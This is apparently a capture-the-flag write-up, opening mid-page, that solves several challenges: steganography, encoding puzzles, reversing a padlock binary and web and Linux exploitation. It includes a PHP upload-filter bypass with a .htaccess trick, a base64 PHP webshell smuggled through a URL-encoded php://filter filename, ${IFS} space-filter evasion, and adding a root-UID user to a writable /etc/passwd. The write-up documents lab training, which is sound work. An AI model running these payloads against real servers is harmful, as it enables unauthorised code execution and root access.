Oooh, that classic twang! The banjo is one of my favorite strings instruments!
</code></pre><p>Download the image, and use the <strong><strong><strong><strong><strong><strong><strong>strings</strong></strong></strong></strong></strong></strong></strong> command on it, then <strong><strong><strong><strong>grep flag</strong></strong></strong></strong></p>
<p><code>⌨️ strings banjo.jpg | grep flag</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268383-2e539cec-5632-4a7d-8594-9a741322edb6.png" alt="2022-12-17-191103_1888x1032_scrot"></p>
<p>flag → <strong>flag{ce4e687e575392ae242f0e41c888de11}</strong></p>
<h1 id="arjeebee">Arjeebee</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

What is the rgb(19,55,175) color in its hexadecimal representation?
</code></pre><p>Go to <a href="https://www.rgbtohex.net/">rgbtohex.net</a> and enter the RGB values</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268387-601be543-3b43-404f-8a2f-8d755ac02d58.png" alt="2022-12-17-191342_762x467_scrot"></p>
<p>flag → flag{#1337AF}</p>
<h1 id="way-2-basic">Way 2 Basic</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Here is some data represented in base 2. What is this data represented as ASCII text?

01100110 01101100 01100001 01100111 01111011 00111001 00110000 01100011 00110110 01100101 01100010 01100101 00111001 00110100 00110001 00110101 00110110 00110001 01100011 01100110 01100001 01100100 01100110 01100001 01100101 00110001 00110111 00110000 01100001 00111000 01100110 00110000 01100101 01100001 00110010 00110101 00110010 01111101
</code></pre><p>Go to <a href="https://www.rapidtables.com/convert/number/binary-to-ascii.html">any binary to text website</a> (base 2 and binary are the same thing)</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268400-4c9af57c-7224-425b-a37e-d734dc4b89fc.png" alt="2022-12-17-191609_646x566_scrot"></p>
<p>flag → <strong>flag{90c6ebe941561cfadfae170a8f0ea252}</strong></p>
<h1 id="byepass">Byepass</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Help yourself Say Goodbye to days gone by with our easy online service! Upload your photos to capture the memory, cherish them with friends and family, and savor the time we have together!

Retrieve the flag out of the root of the filesystem /flag.txt.
</code></pre><p>Since we have the website’s source code, we can see that there is an upload form at <strong><strong>/save_memories.php</strong></strong></p>
<p>We can also see which file extentions are blacklisted</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$ext_denylist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php2&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php3&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php4&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php5&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php6&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php7&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phps&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phps&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pht&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phtm&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phtml&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pgif&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;shtml&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phar&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;inc&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;hphp&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ctp&#34;</span>,
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>The danger when using blacklists is forgetting something, and that’s what happened here: the <strong><strong><strong><strong><strong><strong>.php16</strong></strong></strong></strong></strong></strong> extention is not filtered</p>
<p>The challenge’s description tells us that the flag is located in the root of the filesystem, so we can directly try to <strong><strong><strong>cat</strong></strong></strong> it using php</p>
<p>First, let’s create a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> file, with our malicious code inside</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat ../../../../../flag.txt&#34;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Upload it, and read it by going to <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268408-9edb7538-8a43-4293-9b0c-158781ecb8e7.png" alt="2022-12-17-203048_930x1026_scrot"></p>
<p>aaaaaand… it’s blank</p>
<p>This can happen for two reasons:</p>
<ul>
<li>It did not manage to <strong><strong><strong>cat</strong></strong></strong> the file</li>
<li>PHP engine is not enabled</li>
</ul>
<p>Assuming <strong><strong><strong><strong><strong><strong><strong><strong>flag.txt</strong></strong></strong></strong></strong></strong></strong></strong> exists, it is because the php engine is not enabled</p>
<p>By looking at the request, we know it’s running Apache, so we can try to upload a <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong> file that will enable <strong><strong><strong>php</strong></strong></strong></p>
<p>.htaccess:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">AddType</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">php16</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php_flag</span> <span style="color:#a6e22e">engine</span> <span style="color:#a6e22e">on</span>
</span></span></code></pre></div><p>Upload dit, and read it by going to <strong><strong><strong>/.htaccess</strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268411-9a442e5e-2855-4e30-b312-2c42a7dbbedd.png" alt="2022-12-17-203816_929x261_scrot"></p>
<p>We get a 403 Forbidden response, <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>which is a good sign</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, because by default, Apache prevents users from reading files such as <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>Now, let’s re-upload our <strong><strong><strong><strong><strong>php16</strong></strong></strong></strong></strong> file</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268416-303e5c36-bb7d-4646-b814-83652f92294f.png" alt="2022-12-17-204028_834x171_scrot"></p>
<p>The PHP is now executed and not read</p>
<p>flag -&gt; <strong>flag{32697ad7acd2d4718758d9a5ee42965d}</strong></p>
<h1 id="use-after-exit">Use After Exit</h1>
<pre tabindex="0"><code>Author: @carlopolop#3938

It&#39;s as easy as it looks, isn&#39;t it?
</code></pre><p>When we visit the website, we can see the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;submit&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $file_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">urldecode</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
</span></span><span style="display:flex;"><span>    $tmp_path <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>($file_name, <span style="color:#e6db74">&#34;.jpg&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Invalid file name&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($tmp_path);
</span></span><span style="display:flex;"><span>    $all_content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php exit(0);&#39;</span><span style="color:#f92672">.</span> $content <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;?&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>    $handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($file_name, <span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($handle, $all_content);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($handle);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Done.&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>So we are going to have 2 things to bypass:</p>
<ul>
<li>File needs to have .jpg in its name</li>
<li><code>&lt;?php exit(0); ?&gt;</code> will be written at the beginning of the file</li>
</ul>
<p>The first condition is very easy to bypass, since <strong><strong><strong><strong><strong><strong>strpos</strong></strong></strong></strong></strong></strong> checks if “.jpg” is <strong><strong><strong><strong><strong><strong><strong><strong>anywhere</strong></strong></strong></strong></strong></strong></strong></strong> in the file name, not at the end, so we can upload <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>exploit.jpg.php</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>The second condition is more annoying, but by reading the <a href="https://www.php.net/manual/en/function.fopen.php">fopen manual</a>, and the <a href="https://www.php.net/manual/en/wrappers.php">supported wrappers page</a>, we understand that we can use <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>php wrappers</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> such as <strong><strong><strong><strong><strong><strong><strong><strong><strong>filter://</strong></strong></strong></strong></strong></strong></strong></strong></strong> inside of the fopen function</p>
<p>This is useful because if we look at the top of the script, the name of the file is passed through the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>urldecode()</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> function</p>
<p>That will allow us to have special characters such as / in our file name</p>
<p>To prevent the <strong><strong><strong><strong><strong><strong><strong>exit(0)</strong></strong></strong></strong></strong></strong></strong> from bothering us, we will be using the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>php://filter/convert.base64-decode</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> wrapper, because if we try to decode <strong><!-- raw HTML omitted --></strong> from base64, it gives us this: <strong>^+t</strong>, which is exactly what we want</p>
<p>Let’s base64 encode a php “webshell”:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span><span style="color:#f92672">+</span>
</span></span></code></pre></div><p>and paste this into a file that we’ll call</p>
<p><code>⌨️ php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Dshell.jpg.php</code></p>
<p>that way, when it will be passed through the <strong><strong><strong><strong><strong><strong><strong><strong><strong>urldecode</strong></strong></strong></strong></strong></strong></strong></strong></strong>() function, the filename will look like this</p>
<p><code>⌨️ php://filter/convert.base64-decode/resource=shell.jpg.php</code></p>
<p>He will then decode and write this to shell.jpg.php:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span><span style="color:#f92672">+</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>which will look like this atfer decoding</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">^+</span><span style="color:#a6e22e">t</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Now that we’ve got our webshell, we can get the flag from user’s home by navigating to <strong><strong><strong><strong>/shell.jpg.php?cmd=cat ../../../../home/user/flag.txt</strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268427-34eaece6-b4cb-4711-bfa4-a0c8a6f4a540.png" alt="2022-12-17-202338_930x1026_scrot"></p>
<p>flag → <strong><strong><strong><strong><strong><strong>flag{ab5f69d6cc412345387a0ca3a4700398}</strong></strong></strong></strong></strong></strong></p>
<h1 id="padlock">Padlock</h1>
<pre tabindex="0"><code>Author: @birch#9901

I forgot the combination to my pad lock :(
</code></pre><p>First step is to run the binary, and see how it acts</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268431-b33f5b14-4617-4e3d-9fa1-e91d9cf42ad3.png" alt="2022-12-17-230325_551x808_scrot"></p>
<p>It asks for a passcode, then probably compares it with the right passcode</p>
<p>We’ll throw it into IDA, and press <strong><strong>F5</strong></strong> to generate a pseudocode</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_lock</span>(<span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter the passcode: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_fscanf</span>(_bss_start, <span style="color:#e6db74">&#34;%s&#34;</span>, s);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The passcode you entered was: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">51LL</span>, <span style="color:#ae81ff">101LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">95LL</span>, <span style="color:#ae81ff">32LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">48LL</span>, <span style="color:#ae81ff">111LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">52LL</span>, <span style="color:#ae81ff">97LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(s) <span style="color:#f92672">==</span> <span style="color:#ae81ff">38</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;master locks arent vry strong are they&#34;</span>, s) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">101LL</span>, <span style="color:#ae81ff">51LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">32LL</span>, <span style="color:#ae81ff">95LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">111LL</span>, <span style="color:#ae81ff">48LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">97LL</span>, <span style="color:#ae81ff">52LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlock</span>(s);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not quite!&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that it takes our input, then replaces some values and compares it with the string <strong>&ldquo;master locks arent vry strong are they&rdquo;</strong></p>
<p>These values in the <strong><strong><strong><strong><strong><strong>replace()</strong></strong></strong></strong></strong></strong> function are annoying so we are going to select them and press <strong><strong><strong><strong><strong><strong><strong><strong><strong>R</strong></strong></strong></strong></strong></strong></strong></strong></strong> (which will give us their Char value)</p>
<p>The pseudocode now looks like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_lock</span>(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter the passcode: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_fscanf</span>(_bss_start, <span style="color:#e6db74">&#34;%s&#34;</span>, s);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The passcode you entered was: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(s) <span style="color:#f92672">==</span> <span style="color:#ae81ff">38</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;master locks arent vry strong are they&#34;</span>, s) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlock</span>(s);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not quite!&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that it takes our input, “unleetifies” it (replaces 3 with e, spaces with _, 4 with a and 0 with o), compares it with the passcode and then calls the <strong><strong><strong><strong><strong><strong><strong><strong>unlock()</strong></strong></strong></strong></strong></strong></strong></strong> function</p>
<p>So, we just have to run the binary and enter the following passcode:</p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>m4st3r_l0cks_4r3nt_vry_str0ng_4r3_th3y</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268433-7297da21-0953-4a8c-81e1-6db25c4188b4.png" alt="2022-12-17-231231_758x783_scrot"></p>
<p>flag → <strong>flag{264cec034faef71c642de1721ea26b1f}</strong></p>
<h1 id="the-space-between-us">The Space Between Us</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

I&#39;ve never felt this close to a character before. I hope the feeling is mutual...

Escalate your privileges and retrieve the flag out of root&#39;s home directory.
</code></pre><p>When we connect to the machine using netcat, we see that every spaces are filtered in our commands:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268435-08961a13-3c6a-4d94-a172-d356d9fcb606.png" alt="2022-12-17-231433_634x459_scrot"></p>
<p>So, the first step is finding a way to execute commands with spaces</p>
<p>And to do that, there is an environment variable that exists by default in linux: <strong><strong><strong><strong><strong><strong>${IFS}</strong></strong></strong></strong></strong></strong></p>
<p>For example, to execute <strong><strong><strong><strong><strong><strong>ls -la</strong></strong></strong></strong></strong></strong>, we will have to write <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>ls${IFS}-la</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>Now that we know this, we can list the content of the folder</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268441-0a174e6c-90e2-42cd-b40b-5cd5c1d450ae.png" alt="2022-12-17-231629_567x259_scrot"></p>
<p>We can see a <strong><strong><strong><strong><strong><strong><strong><strong><strong>README.md</strong></strong></strong></strong></strong></strong></strong></strong></strong> file, let’s take a look at it</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268447-6667c331-b64d-4329-8d76-ee4f4a9c82f4.png" alt="2022-12-17-231714_494x197_scrot"></p>
<p>It says that there is a misconfiguration in the filesystem, so we can start taking a look around</p>
<p>After spending a good hour enumerating every files and their permissions, I see that the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/etc/passwd</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> is writable</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268453-d9048712-2fc6-4709-9d19-1e8b10cb6e3f.png" alt="2022-12-17-231901_556x99_scrot"></p>
<p>We are going to add a user to the file, who’s home directory will be <strong><strong><strong><strong><strong>/root</strong></strong></strong></strong></strong></p>
<p>First, we need to generate a password hash for the user</p>
<p><code>⌨️ openssl passwd hack</code></p>
<p>Then, add a new line to the <strong><strong><strong><strong><strong><strong>passwd</strong></strong></strong></strong></strong></strong> file using echo (because nano &amp; vim arent working)</p>
<p><code>⌨️ echo${IFS}&quot;hacker:ZUVbo0DtkXUXw:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268459-7a396236-e4e3-4cbe-b17a-b272225c6241.png" alt="2022-12-17-182345_1888x1032_scrot"></p>
<p>Of course, we still can’t use spaces so we use <strong><strong><strong><strong><strong><strong>${IFS}</strong></strong></strong></strong></strong></strong></p>
<p>Now, we can read <strong><strong><strong><strong><strong><strong><strong><strong>/root/flag.txt</strong></strong></strong></strong></strong></strong></strong></strong> as this user using <strong><strong><strong>su</strong></strong></strong></p>
<p><code>⌨️ echo${IFS}hack${IFS}|${IFS}su${IFS}-${IFS}hacker${IFS}-c${IFS}&quot;cat&lt;/root/flag.txt”</code></p>
